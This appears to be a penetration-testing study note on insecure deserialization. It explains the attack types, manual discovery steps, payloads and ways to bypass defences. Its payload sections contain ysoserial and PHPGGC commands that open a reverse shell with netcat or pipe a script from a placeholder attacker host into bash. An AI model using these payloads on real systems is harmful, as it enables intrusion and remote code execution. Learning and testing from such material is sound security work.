# Index
- [[Back End Vulnerabilities]]
	- [[1. Insecure File Uploads]]
	- [[2. File Inclusion]]
	- [[3. Command Injection]]
	- [[4. SQL Injection (SQLi)]]
	- [[5. Server-Side Request Forgery (SSRF)]]
	- [[6. Server-Side Template Injection (SSTi)]]
	- [[7. XML External Entity (XXE)]]
	- [[8. Insecure Deserialization]]

# Insecure Deserialization

Insecure Deserialization is a critical vulnerability that occurs when untrusted or user-controlled data is deserialized by an application without proper validation. Deserialization is the process of converting serialized data (data structured in a format like JSON, XML, or binary) back into its original object or data structure. If this process involves untrusted input, an attacker can manipulate the serialized data to inject malicious objects or manipulate the data in a way that causes the application to execute arbitrary code, gain unauthorized access, or perform other dangerous actions.

Insecure Deserialization is particularly dangerous because it can lead to remote code execution (RCE), privilege escalation, and other serious consequences if the deserialized data is directly executed or used within critical application functions.

# How Insecure Deserialization Works

Insecure Deserialization exploits the process where applications accept and trust serialized data without validation, allowing attackers to modify or inject malicious serialized objects. Here's a breakdown of how the vulnerability works:

1. **Serialization and Deserialization Basics**
   - **Serialization** is the process of converting an object into a format that can be stored or transmitted (such as JSON, XML, or binary formats).
   - **Deserialization** is the reverse process where the serialized data is converted back into its original object or data structure.
2. **Application Receives Serialized Data:** The application accepts serialized data (from cookies, HTTP parameters, API payloads, or files) and deserializes it to reconstruct the original object. The serialized data may represent user sessions, configuration data, or other sensitive structures.
3. **Untrusted Data is Deserialized:** If the serialized data is not properly validated, attackers can manipulate it. By modifying serialized objects (such as changing values or injecting malicious payloads), attackers can cause unexpected behavior during deserialization.
4. **Object Injection or Manipulation:** During deserialization, the application processes the data, converting it back into objects. If the deserialized object includes attacker-controlled code or references to dangerous classes or methods, this can lead to remote code execution, privilege escalation, or other harmful outcomes.
5. **Attack Consequences:** Depending on the application's functionality and the data being deserialized, the attacker may be able to:
     - Execute arbitrary code on the server.
     - Modify application behavior (e.g., escalate privileges).
     - Access sensitive data.
     - Cause denial of service (DoS) by deserializing harmful objects.

# Types of Insecure Deserialization

Insecure Deserialization vulnerabilities can manifest in several different ways depending on the attacker's goals and the structure of the serialized data:

## Remote Code Execution (RCE) via Object Injection
   - The attacker modifies the serialized data to inject objects or references to dangerous classes that lead to the execution of arbitrary code during deserialization.

### How RCE via Object Injection Works
1. The attacker identifies serialized data (such as a session object or API payload).
2. They modify the serialized data to inject malicious code or objects that trigger dangerous methods during deserialization.
3. The server deserializes the manipulated object and executes the injected code, leading to RCE.

**Example:**  
In Java, an attacker might inject malicious code that triggers methods from vulnerable libraries such as **Commons Collections:**
```java
# Exploit: Injected serialized payload that executes arbitrary commands
java.util.PriorityQueue.readObject()
```

## Privilege Escalation via Object Manipulation
   - The attacker modifies serialized objects to escalate their privileges or gain unauthorized access to resources.

### How Privilege Escalation via Object Manipulation Works
1. The attacker captures serialized data representing a user session or role.
2. They modify the serialized data to elevate their privileges (e.g., change their role from "user" to "admin").
3. The server deserializes the manipulated object, granting the attacker unauthorized access or higher privileges.

**Example:**  
In an application where user roles are serialized, the attacker changes their role to "admin":
```json
{
    "user": "attacker",
    "role": "admin"
}
```

## Denial of Service (DoS) via Malicious Object Injection
   - Attackers may inject objects that consume excessive resources or crash the application during deserialization, leading to denial of service.

### How DoS via Malicious Object Injection Works
1. The attacker modifies the serialized data to include objects or references that cause resource exhaustion (e.g., excessive memory allocation).
2. During deserialization, the server attempts to process the object, consuming resources or crashing the application.

**Example:**  
An attacker might inject an object that triggers an infinite loop during deserialization.

# Common Serialization Formats

## JSON
- **Example:**

```
{
  "username": "attacker",
  "admin": true
}
```

## XML
- **Example:**

```
<user>
  <username>attacker</username>
  <admin>true</admin>
</user>
```

## Binary (e.g., Java Serialization)
- **Example:**

```
import java.io.*;

public class User implements Serializable {
  public String username;
  public boolean admin;
}

User user = new User();
user.username = "attacker";
user.admin = true;
```

## YAML
- **Example:**

```

username: attacker
admin: true
```

# Manual Discovery Techniques for Insecure Deserialization

Manually discovering Insecure Deserialization vulnerabilities involves identifying areas where serialized data is being processed and testing how the application handles modified serialized inputs. Here's a step-by-step guide for manual discovery:

## 1. Identify Serialized Data
- Look for places in the application where serialized data is used. This can include:
  - **Cookies:** Serialized session objects stored in cookies.
  - **HTTP Parameters:** Data passed through URL parameters or request bodies.
  - **File Uploads:** Files that contain serialized objects (e.g., serialized Java objects or PHP sessions).

## 2. Capture and Analyze Serialized Data
- Use tools like **Burp Suite** or **OWASP ZAP** to intercept and capture serialized data. Analyze the data to determine its structure.
  - For example, serialized data may look like:
    - JSON: `{ "user": "attacker", "role": "user" }`
    - Base64-encoded data: `rO0ABXNyACpvcmcuYXBhY2hlLmNvbW1vbnMubGFuZy5pbnZva2UuSW52b2tlci5JbnZva2F0aW9uI0Aw`

## 3. Modify and Resend Serialized Data
- Modify the captured serialized data and resend it to the server to test how the application handles deserialization.
  - **Example:** Change user roles or object values.
    ```json
    { "user": "attacker", "role": "admin" }
    ```
  - **Base64 Example:** Modify the base64-encoded serialized object and observe the applicationâ€™s response.

## 4. Test with Known Deserialization Gadgets
- For languages like Java, PHP, or Python, use known deserialization gadgets (vulnerable objects or classes) to test for code execution or other vulnerabilities.
  - **Java Example:** Inject a serialized payload that triggers the **Commons Collections** deserialization vulnerability.

## 5. Fuzzing with Tools (e.g., ysoserial, PHPGGC)
- Use tools like **ysoserial** (for Java) or **PHPGGC** (for PHP) to generate malicious serialized payloads and test the application.
  - **ysoserial** Example:
    ```bash
    java -jar ysoserial.jar CommonsCollections1 'nc -e /bin/bash <attack_ip> <attack_port>' > payload.ser
    ```
  - Send the generated payload to the application.

## 6. Detect Deserialization Errors and Stack Traces
- Pay attention to any stack traces or errors returned by the application when sending modified serialized data. These can indicate that deserialization is occurring and may provide useful information about the vulnerable classes or objects being used.

# Insecure Deserialization Payloads

Here are common payloads and examples used to exploit Insecure Deserialization vulnerabilities:

## Remote Code Execution (RCE) Payloads
   - **Java RCE Payload** (using ysoserial and Commons Collections):
     ```bash
     java -jar ysoserial.jar CommonsCollections1 'curl http://<attack_ip>/malicious.sh | bash' > payload.ser
     ```
     - This generates a malicious Java object that triggers a command injection when deserialized.

   - **PHP RCE Payload** (using PHPGGC):
     ```bash
     phpggc Symfony/RCE1 exec 'nc <attack_ip> <attack_port> -e /bin/bash' > payload.txt
     ```
     - This generates a serialized PHP object that spawns a reverse shell.

## Privilege Escalation Payloads
   - Modify user roles or session data to escalate privileges.
     ```json
     { "user": "attacker", "role": "admin" }
     ```

   - In base64-encoded formats, decode, modify, and re-encode the serialized object:
     ```bash
     echo 'original_base64_string' | base64 --decode
     # Modify the decoded object
     echo 'modified_object' | base64
     ```

## Denial of Service (DoS) Payloads
   - Inject objects that trigger excessive memory or CPU consumption. For example, in Python, deserializing objects like recursive lists can cause memory exhaustion.

# Bypassing Defenses

Here are common techniques to bypass defenses and protections that may be in place to prevent Insecure Deserialization attacks:

## Bypass Validation with Encoding or Obfuscation
   - Applications may check or validate serialized data, but these checks can sometimes be bypassed by using encoding or obfuscation techniques:
     - **Base64 Encoding:** Modify serialized data, re-encode it in base64, and resend it.
     - **Object Property Manipulation:** Modify properties within serialized objects that are not properly checked.

## Exploit Known Gadget Chains
   - Many frameworks and libraries have known gadget chains (vulnerable classes or methods) that can be exploited during deserialization. Tools like **ysoserial** and **PHPGGC** generate payloads that leverage these gadgets.
   - **Example:**
     - Java applications using the **Commons Collections** library are vulnerable to deserialization attacks using gadget chains like `CommonsCollections1` or `CommonsCollections7`.

## Bypass Length or Type Restrictions
   - Some applications enforce restrictions on the length or type of serialized data. You can bypass these by crafting serialized data that appears legitimate but contains malicious payloads hidden within objects that are deserialized.

## Use Alternate Serialization Formats
   - Applications may use multiple serialization formats (JSON, XML, Java, etc.). If one format has stricter validation than others, try different formats to find a less secure deserialization method.
     - For example, PHP applications may accept both serialized PHP objects and JSON data. If PHP object deserialization is better protected, switch to JSON.

# Resources

|**Website**|**URL**|
|-|-|
|OWASP Insecure Deserialization|https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data|
|PortSwigger Insecure Deserialization|https://portswigger.net/web-security/deserialization|
|HackTricks Deserialization Guide|https://book.hacktricks.xyz/pentesting-web/deserialization|
|PayloadAllTheThings (Deserialization)|https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Deserialization|
|ysoserial (Java)|https://github.com/frohoff/ysoserial|
|PHPGGC (PHP)|https://github.com/ambionics/phpggc|
|Exploit Database (Insecure Deserialization)|https://www.exploit-db.com/|
|CommonsCollections Gadget Chains|https://commons.apache.org/proper/commons-collections/